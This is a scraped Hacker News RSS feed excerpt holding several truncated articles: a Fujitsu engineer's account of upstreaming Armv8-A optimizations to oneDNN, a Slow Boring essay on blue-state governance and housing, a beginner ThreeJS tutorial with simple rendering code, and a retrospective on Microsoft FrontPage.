<p>I mentioned earlier that oneDNN source code has been released as OSS, but that is not all. It is being developed using an open development style that allows anyone to submit a pull request for source code they want to improve (request to incorporate improved source code into oneDNN). When a pull request has been submitted, the new source code is reviewed for bugs and tested to confirm that it improves the processing speed of oneDNN or helps to expand its functionality. If it passes both the review and test, it is incorporated into oneDNN. oneDNN is a software developed initially for CPUs with the x64 instruction set. The source code for our version of oneDNN, ported to and optimized for the Armv8-A instruction set, is available at <a href="https://github.com/fujitsu/oneDNN">https://github.com/fujitsu/oneDNN</a>. However, we thought that it would be beneficial for Fugaku users and many users in the world of CPUs that use the Armv8-A instruction set, if an implementation highly tuned for the main branch of oneDNN (the de facto DL process library) had been incorporated from the start. We therefore decided to work with Intel and actively submit a pull request to incorporate our changes into the main branch of oneDNN.</p>

<p>Incidentally, the improvements we made optimizing oneDNN for the Armv8-A instruction set were quite extensive, such as incorporating a required descriptor called Xbyak_aarch64 (explained later). For minor changes, all you need to do is modify the source code and submit a pull request. However, when submitting a pull request for large-scale changes to source code or for changes to APIs for parts related to the framework for oneDNN, you must first write a document called a Request For Comments (RFC) that describes what will be changed and summarizes the plan for doing so. Then, you must submit a pull request for the RFC itself for review and then merging. I put a lot of effort into writing the RFC knowing that this would benefit the many users of Fugaku and Armv8-A in the world. I treated this even more seriously than writing a research paper. It was a ton of work. But I finally did it. I submitted my RFC pull request. Before long, I received a question from an Intel developer on the RFC. I worked late into the night to make sure my answer was thorough. Then I went to sleep. And then I woke up. And then there was the next question. The Intel developer was located in the US, and because of the time difference the next question had been sent by the time I woke up. Not getting discouraged, I sent my response. Then I went to bed. And then I woke up. Next, the Intel developer had invited a developer from Arm to join in, since my RFP concerned an Arm product. It was now two-on-one battle. The Arm developer was located in the U.K. It was like we were playing volleyball and Arm and Intel had teamed for a spike fake-out. I could barely keep up. However, I were somehow able to answer all of their questions and they ultimately approved the RFC I had submitted. (Actually, they were really great people that treated me very kindly and asked purely technical questions. The fact that their questions came right after I responded due to the time difference actually meant that the process was going smoothly and shortened the time up to merging of the RFC.)</p>

<p>Once the RFC was merged, I next needed to submit a pull request for source code modified based on the RFC. I was able to keep up with the â€œspike fake-outsâ€� by Arm and Intel, and ultimately had the source code merged.
Having the source code (optimized for the Armv8-A instruction set) merged in an OSS project spearheaded by Intel caused quite a commotion in Fujitsu. It makes sense though. After all, from Intelâ€™s perspective this would help collaborating companies. Of course, the primary reason for this was that Intel opened the door on pull requests for other CPUs. So first of all, I would like to express my gratitude here for Intel. The secondary reason for this is that our source code was technically solid and that Intel recognized that it would help in developing DL process libraries. I do have to admit that I am a bit proud of this.</p>

<h2>Development of Xbyak_aarch64</h2>

<p>It is now time to discuss at some depth the technical aspects of porting and optimizing oneDNN for the Armv8-A instruction set. One of the key technologies in Intel's oneDNN is that it incorporates a JIT assembler called Xbyak (see the figure below).</p>

<figure title="Source code structure of oneDNN"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072153.png" alt="f:id:fltech:20201117072153p:plain" title="" itemprop="image"></span><figcaption>Source code structure of oneDNN</figcaption></figure>

<p>Xbyak is a software developed by Shigeo Mitsunari of Cybozu Labs and released as <a href="https://github.com/herumi/xbyak">OSS (https://github.com/herumi/xbyak)</a>. Xbyak offers the following features.</p>

<ol>
<li>Assembler programs can be written in C++</li>
<li>Executable …</li></ol></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en">https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en</a></em></p>]]>
            </description>
            <link>https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155872</guid>
            <pubDate>Thu, 19 Nov 2020 23:55:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make Blue America Great Again]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155793">thread link</a>) | @nutshell89
<br/>
November 19, 2020 | https://www.slowboring.com/p/make-blue-america-great-again | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/make-blue-america-great-again">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Happy Monday! </p><p>I’m very excited to get my first real week here at <code>Slow Boring</code> off the ground. But first I wanted to thank everyone who subscribed on Friday or over the weekend. The show of support is incredibly gratifying, and with your help I think we can make this thing work. We’re going to do four weeks of free content, after which most of the content will be for paying members only, so sign up now while introductory rates apply. </p><p>I’d also like to encourage members to participate in the comments sections and open threads. I’ve traditionally been very comments-averse myself, even while thinking that comments seem like a good idea in theory. But I realized that paid membership programs are the right way to make this work. Since the only people in the comments are the people who are sufficiently bought-in to pay money, you’re not going to have drive-by trolling. I’ve been delving in and engaging, and I hope you will, too. </p><p>Now, on to the main event: I want to talk about the important question of what progressives do in politics in the places we govern.</p><h4>An upside to NIMBYism?</h4><p>Since people know I’m interested in the geographic bias of the political system and also in the consequences of housing scarcity in coastal cities, one question people sometimes ask me is whether NIMBYism is politically beneficial. The idea here is that housing scarcity in California drives people out of the state and into more conservative areas, which helps Democrats fight Senate skew.</p><p>I think this is probably wrong, factually speaking. California has what’s basically a state-level version of the Congressional Budget Office called the Legislative Analyst’s Office, and when they looked at <a href="https://lao.ca.gov/LAOEconTax/Article/Detail/265">net migration to and from California</a>, they found that “families with kids and those with only a high school education predominate among those moving from California to its top destination states,” while “college-educated 18 to 35 year olds led the way among those moving to California.” That makes sense as it’s working class families with kids who suffer most from housing scarcity. But that means it’s probably disproportionately Republicans leaving, which is also what <a href="https://www.sacbee.com/news/local/sacramento-tipping-point/article246370775.html">most of the anecdotal reporting says</a>. By the same token, exit polls say <a href="https://www.dallasnews.com/news/politics/2018/11/09/native-texans-voted-for-native-texan-beto-o-rourke-transplants-went-for-ted-cruz-exit-poll-shows/">Beto O’Rourke won native-born Texans in 2018</a> while losing transplants. </p><p>But more fundamentally, I don’t think finding ways to look on the bright side of bad policy choices is a good idea. </p><p>Friday’s post was mostly on the bummer theme of how, if progressives want to get anything done in federal politics, <a href="https://www.slowboring.com/p/welcome-to-slow-boring">we need to reconcile ourselves to trimming our sails quite a bit</a>. But the other side of the coin is that you need to reach for the impossible to some extent or you’ll never achieve anything. Creating an actual statewide high-quality universal preschool program that delivered great results and made everyone happy, for example, would be a great way to build momentum nationally for such a program. </p><p>It’s in the blue states like California where the stuff progressives want to be doing with their energy — dreaming big, organizing, demanding stuff — could actually accomplish something. But it’s going to take hard work and also, yes, some technocratic fussing. </p><h4>Social democracy in one Bay State</h4><p>My go-to example for this is Massachusetts, the state that pioneered both marriage equality and the Affordable Care Act, which became progressives’ two big national successes. </p><ul><li><p>At 6.9 million people, Massachusetts has a larger population than Finland or Denmark. </p></li><li><p>While some people say you can’t create a state-level social democracy in the United States because of the lack of monetary sovereignty, Finland is part of the Eurozone and needs to follow EU fiscal rules, and Denmark has its currency pegged to the Euro. </p></li><li><p>Massachusetts has open borders with the rest of the United States, but Finland and Denmark have open borders with the EU. </p></li><li><p>In PPP-adjusted terms, Massachusetts’ GDP per capita is a bit higher than oil-rich Norway and decidedly higher than Finland or Denmark.</p></li></ul><p>Long story short, Massachusetts has the material resources to make social democrats’ dreams come true. And even though Elizabeth Warren’s election results there indicate pretty clearly that she pays an electoral penalty for being seen as an unusually left-wing Democrat, she still easily wins statewide elections — “hey, those ideas are unusually left-wing!” is not an obvious loser there. </p><p>If the way forward for <em>Democrats</em> is to reconcile themselves to the realities of the political map, the way forward for <em>progressives</em> is to try to put forward a vision that’s actually exciting and appealing to the unusually progressive electorate of places like Massachusetts, then implement it in those places in a way that makes progressive politics look successful and appealing to voters everywhere. </p><ul><li><p>You probably can’t do “Medicare for All” in one state because of interactions with the federal Medicare program, but you could definitely do an ambitious public option with auto-enrollment that’s designed to gain market share over time.</p></li><li><p>You could definitely do free public college, or if that’s too expensive, you could do free community college. </p></li><li><p>All kinds of Green New Deal stuff about energy and transportation infrastructure is doable on the state level. </p></li><li><p>Child allowance and other strategies to reduce poverty are very doable on the state level, as are preschool and child care plans. </p></li><li><p>As David Madland points out, <a href="https://www.americanprogress.org/issues/economy/reports/2019/12/11/478539/guide-state-local-workers-boards/">state governments can even create wage boards</a> and move to a system of sectoral collective bargaining. </p></li></ul><p>State government is not a panacea or a long-term alternative to building national political power. But it is potentially a very effective way to make people’s lives better. And more to the point, it is potentially a very effective way to build national political power by <em>showing people you have good ideas that work</em> and that you know what you’re doing. </p><p>But a more ambitious version of state-level progressive governance would also have to confront the question of whether or not Blue America’s political leaders <em>do</em>, in fact, know what they’re doing. </p><h4>Who is Blue America for?</h4><p>I grew up in Manhattan, went to Harvard, then moved to DC, so I am personally a pretty out-of-touch person. </p><p>But my broad sense is that most middle class Americans think of the big blue states, especially New York and California, as nice places to live for rich snobs, not as places that have really high quality public services. People who wouldn’t want to live in Finland (it’s too cold, too dark, bad food) could still concede that it would be nice to have all these free social benefits. But while taxes really are higher in blue America, it’s not like San Francisco has the country’s best public schools or SUNY is the most impressive public university system. </p><p>That’s not to say these are horrible places to live! But what you get in New York is access to a unique set of cultural amenities. California has cultural amenities, great weather, and access to the natural beauty that lurks right outside the major cities. To gain access to those amenities you need to deal with  high housing costs. So if you’re rich and enjoy that stuff, you can have a nice house in Brooklyn. Alternatively, if you’re rich and live someplace cheaper, you can have a giant mansion, a couple of fancy cars, and a boat. If you’re <em>young,</em> you can have dismal accommodations in a big liberal city but have fun going out and meeting people. But a middle class couple with a generic job and a couple of kids isn’t setting out to blue America for the higher material living standards.  </p><p>That’s because there are huge regional differences in the cost of living in the United States, they disfavor the blue coastal areas, and they’re driven by housing costs.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png&quot;,&quot;height&quot;:525,&quot;width&quot;:602,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:223939,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If you’ve read anything that I’ve written ever, you know <a href="https://www.amazon.com/Rent-Too-Damn-High-Matters-ebook/dp/B0078XGJXO">the reason is land use regulations</a>. Reforming those policies is critical to making blue states great places to live, places that people associate with prosperity and policy success rather than eccentric lifestyle preferences. </p><p>And while public housing, affordable housing set-asides, and other forms of non-market or “social” housing can be a piece of the puzzle, market-rate housing is essential. </p><p>One reason it’s essential is that a well-governed, great place to live should be accessible to middle class people, not an upstairs/downstairs economy of rich people and the subsidy-dependent. But another reason is that robust market-rate housebuilding grows the economy and the tax base and at least makes it conceivable that you’re going to provide first-rate public services instead of just paying off old pension debt. And growing the tax base matters. It’s not true that you can’t build a robust welfare state in a governance unit that needs to balance its budget. But it <em>is</em> true that in state and local politics you are playing with real money. Cash spent on the library can’t go to the parks. Cash spent on the bus means higher taxes. To be popular and effective you need to deliver value, especially if you’re not sitting on a geyser of tech IPOs throwing off tax revenue.</p><h4>Subway socialism </h4><p>Over the past few years I’ve gotten really interested in the so-called <a href="https://www.thenation.com/article/archive/last-sewer-socialists/">“sewer socialists” of Milwaukee</a>.</p><p>In the early 20th century there was a big base of German immigrants in the Milwaukee area to whom socialism was not a scary foreign concept, so socialists were able to win elections and control municipal government. In office, they built one of the first municipal public works departments, and they were proud of the DPW’s accomplishments. Other socialists from elsewhere around the country were, as socialists in America typically are, left-wing intellectuals detached from practical governance. And they made fun of these Milwaukee guys for constantly talking about their public works rather than overthrowing capitalism. </p><p>But what the Milwaukee guys got was that if you want non-market provision of stuff, there comes a time when <em>you actually need to go do the stuff</em>.  You can say that <a href="https://www.huffpost.com/entry/vienna-affordable-housing-paradise_n_5b4e0b12e4b0b15aba88c7b0">Vienna proves excellent public housing is …</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/make-blue-america-great-again">https://www.slowboring.com/p/make-blue-america-great-again</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/make-blue-america-great-again</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155793</guid>
            <pubDate>Thu, 19 Nov 2020 23:45:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understand 3D in JavaScript (ThreeJS) in 5 minutes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155776">thread link</a>) | @jesuisundev
<br/>
November 19, 2020 | https://www.jesuisundev.com/en/understand-threejs/ | <a href="https://web.archive.org/web/*/https://www.jesuisundev.com/en/understand-threejs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
<!-- Horizontal Top Article -->
<p>With a little knowledge in Javascript, you can do incredible things in 3D with ThreeJS. It’s much simpler than it looks and it’s so much fun. The only problem is the first learning barrier. Today, I’m taking that barrier down for you in 5 minutes. After that, all you’ll have to do is have fun.</p>



<h3>What is ThreeJS?</h3>



<p>ThreeJS is a library in Javascript, created by <a href="https://twitter.com/mrdoob" target="_blank" rel="noreferrer noopener">Mr.doob</a>, that allows you to manipulate 3D objects directly in the browser. What you have to understand is that ThreeJS, <strong>via Javascript</strong>, allows you to use <a href="https://en.wikipedia.org/wiki/WebGL" target="_blank" rel="noreferrer noopener">WebGL</a> in an <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial" target="_blank" rel="noreferrer noopener">HTML5 canvas</a>.</p>



<p><strong>WebGL</strong> is a <strong>Javascript API</strong> that allows you to create 2D and 3D graphic rendering.<br>A <strong>canvas </strong>is an <strong>HTML component</strong> that is part of the HTML5 specification and allows to display graphic rendering.</p>



<p>ThreeJS, via Javascript, allows you to drive WebGL, and thus 3D. <strong>And the crazy part is that there is no additional installation and/or plugin needed !</strong> Import the the library and voila, the 3D world is opening.</p>



<figure><img src="https://i.imgur.com/voS76PB.jpg" data-src="https://i.imgur.com/voS76PB.jpg" alt=""></figure>



<p>So in summary, we have a <strong>Javascript library<strong>(ThreeJS)</strong></strong> that manipulates a <strong>Javascript API to do graphical rendering</strong> (WebGL) in an <strong>HTML5 component</strong>. Easy!</p>



<p>Now you’re going to tell me, why are we using ThreeJS? If it’s actually WebGL, why not write WebGL directly ?  The answer is pretty simple. </p>



<p>ThreeJS simplifies and shortens to the extreme the code needed to do whatever you want. <strong>ThreeJS does all the complex part for you.</strong> You just have to do simple Javascript on your side.</p>



<p>So if you have simple Javascript knowledge, ThreeJS gives you the power to do incredible things in 3D.</p>



<p>But concretely, how does it work?</p>



<h3>How does it work?</h3>



<p>To understand how ThreeJS works at a high level you need to put yourself in the shoes of a film director. Yes, poof, I’ve just decided, <strong>you’re a movie director now</strong>.</p>



<p>And to shoot your movie in Javascript, you’re going to need to create and manipulate several key elements.</p>



<ul><li><strong>The scene</strong></li></ul>



<p><strong>You can see the scene like the 3D world you’re going to work in.</strong> You’re going to arrange objects in this scene. You’re going to create as many objects as you want in your scene via the meshes.</p>



<hr>



<ul><li><strong>The meshes</strong></li></ul>



<p>Meshes are simply the objects that will be present in your scene. You will need to put light on these objects to see them. To see them, you will have to film them. To film them, you need a camera.</p>



<hr>



<ul><li><strong>The camera</strong></li></ul>



<p>As in real life, the camera will show a point of view of your scene. <strong>We’re going to talk about field of view (fov), to be precise.</strong> By moving the camera, you’re going to move objects in or out of this field of view. It’s what you see in this field of view of this camera that will be sent to the rendering engine.</p>



<hr>



<ul><li><strong>Rendering engine</strong></li></ul>



<p>The rendering engine takes the scene and the camera as parameters. <strong>With that, it displays everything in the HTML5 canvas I was telling you about at the beginning.</strong> The rendering engine will produce an image each time your screen is refreshed. In general, 60 frames per second. That’s what gives life to your animation!</p>



<p>I guess it can still be pretty abstract at the moment. I have to draw you a picture to make it more concrete. Ok, I’ll use my drawing skills then.</p>



<div><figure><img src="https://i.imgur.com/f7FVxpB.jpg" data-src="https://i.imgur.com/f7FVxpB.jpg" alt=""></figure></div>



<p>Can you tell i’m backend developer ?</p>



<p>Anyway, it should be much clearer now between the explanations and the drawing. But we’re getting to know each other, I know you want to see code now.</p>



<h3>Show the code</h3>



<p>As the Hello World app we’ll make it as simple as possible. We’re going to code the schema I made for you just before.</p>



<p>A basic scene with a cube in the middle. Except that instead of the cube, we’re going to put a cylinder, just because I feel like it. <strong>We’re going to make it spin on itself and we’re going to put it in the camera’s field of view.</strong></p>



<p>I’m going to comment strongly on each line so that you understand everything that’s going on. I will also frequently talk about <a href="https://threejs.org/docs/index.html#manual/en/introduction/Creating-a-scene" target="_blank" rel="noreferrer noopener">the official documentation</a>, so don’t hesitate to read it as you go along.</p>



<figure><img src="https://i.redd.it/57vwxbnx22w01.jpg" data-src="https://i.redd.it/57vwxbnx22w01.jpg" alt=""></figure>



<p>We start by <strong>declaring our scene</strong>, without that, nothing is visible! Then <strong>the rendering engine</strong> for our scene. Without this, no image will be created and displayed to the user. Then we want <strong>a camera</strong> to film the scene. Here we will use a perspective camera. The options allow us to configure the field of view.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const scene = new THREE.Scene()
const renderer = new THREE.WebGLRenderer()
const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000)</pre>



<p>We already have everything we need to show things now. Let’s create the cylinder via a <a href="https://threejs.org/docs/#api/en/objects/Mesh" target="_blank" rel="noreferrer noopener">mesh</a>! To create a mesh we need two things.</p>



<p><strong>The geometric shape that the object will have</strong>. Here we want a cylinder so <strong><a href="https://threejs.org/docs/#api/en/geometries/CylinderGeometry" target="_blank" rel="noreferrer noopener">CylinderGeometry</a></strong> is perfect for our needs.</p>



<p><strong>The material of this object.</strong> The material is the digital version of real world materials. The materials control the color of the object and the degree of reflection of the surface. <strong>Here we put a basic material of red color.</strong></p>



<p>With these two parts we can create our object, add it to the scene and place the camera over it.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const geometry = new THREE.CylinderGeometry(5, 5, 20, 32)
const material = new THREE.MeshBasicMaterial({ color: 0xff0000, wireframe: true })
const cylinder = new THREE.Mesh(geometry, material)

scene.add(cylinder)
camera.position.z = 20</pre>



<p>Then, we’re going to put the rendering engine in full screen and add it in the HTML page via the HTML5 canvas!</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">renderer.setSize(window.innerWidth, window.innerHeight)
document.body.appendChild(renderer.domElement)</pre>



<p>Finally, we’re going to animate things up. <strong>We are going to create an animation function that will be called in an infinite loop.</strong> Each time we go through this function we’re going to:</p>



<ul><li>make the cylinder rotate on itself</li><li>ask the rendering engine to create and display an image</li><li>recall this same animation function</li></ul>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function animate() {
    cylinder.rotation.x += 0.01
    cylinder.rotation.y += 0.01

    renderer.render(scene, camera)

    requestAnimationFrame(animate)
}

animate()</pre>



<p>And that’s it ! Done ! I put everything in a codepen and let you play with it now.</p>







<p>I tried to make this article a highway for understanding Javascript 3D. I sincerely think that after this first barrier of understanding, you can quickly do incredible things! Go use you new power now.</p>



<figure><img src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" data-src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" alt=""></figure>



<p>A few weeks ago, I hadn’t touched 3D in any way, shape or form. Starting from the basic example I just presented to you, in a few days,<strong> I created a 3D web experience that takes you through the universe in your browser</strong>.</p>







<p>I’m really super proud of it and I invite you to <a href="https://www.jesuisundev.com/en/across-the-universe/" target="_blank" rel="noreferrer noopener">take a look at it</a>. There’s a story, music and it’s amazing. <strong><a href="https://across-universe.com/" target="_blank" rel="noreferrer noopener">A real show!</a></strong> If you’re even more curious, you have all <strong><a href="https://github.com/jesuisundev/acrosstheuniverse" target="_blank" rel="noreferrer noopener">the source code on my GitHub</a></strong>.</p>



<h3>Epilogue</h3>



<p>If I can do this kind of thing in a week, that’s proof that anyone can do it. Anything you can imagine as animation is within your reach with your knowledge of Javascript. And now that you have the ThreeJS base, it’s up to you to see if the adventure tempts you.</p>

			<!-- clearfix -->
			

			
		</div></div>]]>
            </description>
            <link>https://www.jesuisundev.com/en/understand-threejs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155776</guid>
            <pubDate>Thu, 19 Nov 2020 23:43:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft FrontPage: the good, the bad, the ugly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155442">thread link</a>) | @fanf2
<br/>
November 19, 2020 | https://invisibleup.com//articles/33/ | <a href="https://web.archive.org/web/*/https://invisibleup.com//articles/33/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	
	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
